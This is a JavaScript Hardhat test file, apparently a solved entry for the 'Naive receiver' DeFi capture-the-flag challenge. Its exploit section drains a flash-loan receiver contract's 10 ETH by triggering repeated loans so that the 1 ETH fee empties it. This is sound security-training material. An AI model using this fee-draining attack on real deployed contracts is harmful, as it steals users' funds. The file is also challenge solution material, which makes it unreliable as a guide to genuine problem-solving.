const { ethers } = require('hardhat');
const { expect } = require('chai');
// const NaiveReceiverAttacker = contract.fromArtifact('NaiveReceiverAttacker');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        const NaiveReceiverAttacker = await ethers.getContractFactory('NaiveReceiverAttacker', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);

        this.attacker = await NaiveReceiverAttacker.deploy();
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        var one_tx = true
        if(one_tx==true){
            // this.attacker has a function "attack" that directly call multiple time this.poll flash loan
            // After few calls (10), this.receiver has not anymore token.
            await this.attacker.attack(this.pool.address, this.receiver.address)
        }else{
            var fee = await this.pool.fixedFee();
            while ((await ethers.provider.getBalance(this.receiver.address)).gte(fee)){
                await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
            }
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
